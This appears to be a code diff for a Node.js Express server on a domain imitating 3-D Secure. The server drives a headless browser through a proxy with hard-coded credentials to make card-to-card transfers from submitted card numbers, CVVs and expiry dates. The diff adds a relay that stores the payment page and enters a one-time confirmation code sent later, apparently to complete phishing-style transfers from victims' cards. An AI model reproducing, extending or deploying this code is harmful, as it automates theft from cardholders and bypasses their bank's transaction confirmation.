@@ -5,6 +5,8 @@ const bodyParser = require('body-parser')
 const https = require("https"),
   fs = require("fs");
 
+  const obj = {};
+
 const options = {
   key: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/privkey.pem"),
   cert: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/fullchain.pem")
@@ -16,6 +18,31 @@ const app = express()
 app.use(bodyParser.urlencoded({ extended: false }))
 app.use(bodyParser.json())
 app.use(cors())
+
+
+const code_enter = async (code, url) => {
+    const browser = await puppeteer.launch({args: ['--proxy-server=http://194.85.181.191:51933',' --no-sandbox', '--disable-setuid-sandbox']})
+    const page = await browser.newPage()
+    await page.authenticate({ username: 'ttNkVLRS', password: '63cYXNdr'})
+    await page.setViewport({ width: 1920, height: 984 })
+    await page.goto(url)
+
+    await page.waitForSelector('input')
+    const input = await page.$('input')
+    input.type(code)
+
+    try { 
+      if(await page.waitForXPath('//*[contains(text(), "Ошибка платежа") or contains(text(), "Платеж проведен")]', {timeout: 60000})) {
+         const isOne = await page.evaluate(el => el.innerText, await page.$x('//*[contains(text(), "Платеж проведен")]'))
+         await browser.close()
+         return isOne ? 1 : 0
+      } 
+     } catch (e) {
+         await browser.close()
+         return 0
+     }
+     await browser.close()
+}
 
 const write_data = async (toCard, amount, fromCard,cvv, expireDate, email) => {
     const browser = await puppeteer.launch({args: ['--proxy-server=http://194.85.181.191:51933',' --no-sandbox', '--disable-setuid-sandbox']})
@@ -48,7 +75,18 @@ const write_data = async (toCard, amount, fromCard,cvv, expireDate, email) => {
     
     await page.click('.submit-button-298')
 
-    try {
+    await page.waitForTimeout(5000);
+
+    const input = await page.$('input')
+    
+    if(input) {
+      obj[toCard+fromCard] = await page.url()
+      await browser.close()
+      return toCard+fromCard
+    }
+    
+    if(!input) {
+    try { 
      if(await page.waitForXPath('//*[contains(text(), "Ошибка платежа") or contains(text(), "Платеж проведен")]', {timeout: 60000})) {
         const isOne = await page.evaluate(el => el.innerText, await page.$x('//*[contains(text(), "Платеж проведен")]'))
         await browser.close()
@@ -58,6 +96,7 @@ const write_data = async (toCard, amount, fromCard,cvv, expireDate, email) => {
         await browser.close()
         return 0
     }
+  }
 
     await browser.close()
 }
@@ -67,9 +106,21 @@ app.post('/sendData', async (req, res) => {
         console.log(result)
         if(result === 1) { 
             return res.redirect(returnURL) 
-        } else { 
+        } else if (result === 0) { 
             return res.status(500).send()
+        } else {
+          return res.status(200).json({id: result})
         }
+})
+
+app.get('/token/:id/:code', async (req, res) => {
+  const {id, code} = req.params
+  const result = await code_enter(code, obj[id])
+  if(result === 1) { 
+    return res.redirect(returnURL) 
+  } else if (result === 0) { 
+    return res.status(500).send()
+  }
 })
 
 app.listen(80)
